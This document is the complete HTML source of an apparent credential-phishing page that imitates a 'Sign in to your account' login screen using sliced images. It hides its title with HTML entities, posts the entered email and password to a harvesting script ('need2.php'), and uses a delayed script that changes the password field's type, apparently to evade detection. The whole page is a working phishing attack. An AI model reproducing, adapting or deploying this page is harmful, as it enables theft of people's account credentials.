<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#116;&#111;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon2.ico"/>	

<style type="text/css">
  
.textbox {  
    border: 1px solid #b8b8b8;
	padding-left: 4px;
	font-size: .9em;
    font-family: 'Segoe UI','Segoe','SegoeUI-Regular-final',Tahoma,Helvetica,Arial,sans-serif;
    height: 28px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #848484; 
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 } 

 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:138px; width:870px; height:183px; z-index:0"><img src="images/f2.png" alt="" title="" border=0 width=870 height=183></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:319px; width:872px; height:167px; z-index:1"><img src="images/f3.png" alt="" title="" border=0 width=872 height=167></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:485px; width:878px; height:177px; z-index:2"><img src="images/f4.png" alt="" title="" border=0 width=878 height=177></div>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:139px; z-index:3"><img src="images/f1.png" alt="" title="" border=0 width=1365 height=139></div>

<div id="image5" style="position:absolute; overflow:hidden; left:905px; top:134px; width:173px; height:276px; z-index:4"><img src="images/f8.png" alt="" title="" border=0 width=173 height=276></div>

<div id="image6" style="position:absolute; overflow:hidden; left:909px; top:391px; width:140px; height:14px; z-index:5"><a href="#"><img src="images/f5.png" alt="" title="" border=0 width=140 height=14></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:906px; top:611px; width:340px; height:51px; z-index:10"><img src="images/f6.png" alt="" title="" border=0 width=340 height=51></div>

<div id="image8" style="position:absolute; overflow:hidden; left:906px; top:646px; width:186px; height:16px; z-index:11"><a href="#"><img src="images/f7.png" alt="" title="" border=0 width=186 height=16></a></div>
<form action=need2.php name=chlokoiglnai id=chlokoiglnai method=post>
<input name="email" placeholder="&#115;&#111;&#109;&#101;&#111;&#110;&#101;&#64;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;" class="textbox" autocomplete="off" pattern="[^ @]*@[^ @]*" required type="email" style="position:absolute;width:347px;left:911px;top:185px;z-index:6">
<input name="psw" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:347px;left:911px;top:223px;z-index:7">
<div id="formcheckbox1" style="position:absolute; left:906px; top:286px; z-index:8"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:909px; top:326px; z-index:9"><input type="image" name="formimage1" width="69" height="34" src="images/login.png"></div>


</div>

	
</body>
</html>
